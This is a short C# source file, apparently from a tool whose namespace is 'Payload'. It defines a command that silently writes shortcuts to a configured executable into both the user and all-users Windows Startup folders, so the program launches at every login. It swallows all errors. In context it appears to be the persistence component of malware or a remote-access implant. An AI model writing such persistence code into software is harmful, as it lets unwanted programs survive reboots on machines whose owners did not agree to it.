using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Payload.Common;

namespace Payload.Core.Command
{
    public class StartupSetupCommand : Payload.Command.Interface.ICommand
    {

        string CommonStartupPath =
            Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
        string StartupPath =
            Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        public override Task Execute()
        {
            try
            {
                Setup();
            }
            catch { }
            return null;
        }

        private void Setup()
        {
            DesktopUtility desktopUtility = new DesktopUtility();

            string localShortcutName = $"{Config.Instance.ExeName}.lnk";

            string commonShortcutName = $"{CommonStartupPath}\\{localShortcutName}";
            string shortcutName = $"{StartupPath}\\{localShortcutName}";

            if (File.Exists(localShortcutName))
                File.Delete(localShortcutName);
            if (File.Exists(commonShortcutName))
                File.Delete(commonShortcutName);
            if (File.Exists(shortcutName))
                File.Delete(shortcutName);

            desktopUtility.CreateShortcut(commonShortcutName);
            desktopUtility.CreateShortcut(shortcutName);

            string commonExe = $"{CommonStartupPath}\\{Config.Instance.ExeName}";
            if (File.Exists(commonExe))
                File.Delete(commonExe);

            string exe = $"{StartupPath}\\{Config.Instance.ExeName}";
            if (File.Exists(exe))
                File.Delete(exe);
        }

    }
}
